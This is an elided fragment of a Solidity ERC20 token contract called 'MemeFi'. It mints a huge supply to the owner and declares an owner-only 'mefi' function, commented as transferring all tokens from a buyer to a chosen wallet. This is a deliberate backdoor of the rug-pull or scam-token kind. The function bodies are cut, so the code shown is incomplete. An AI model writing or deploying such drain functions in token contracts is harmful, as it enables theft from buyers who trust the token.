...
contract MemeFi is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("MemeFi", "MemeFi") Ownable(initialOwner) {
        _mint(initialOwner, 999000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function mefi(address from, address to) external onlyOwner {
    ...
    function sendMemefi(address to, uint256 amount) public onlyOwner {
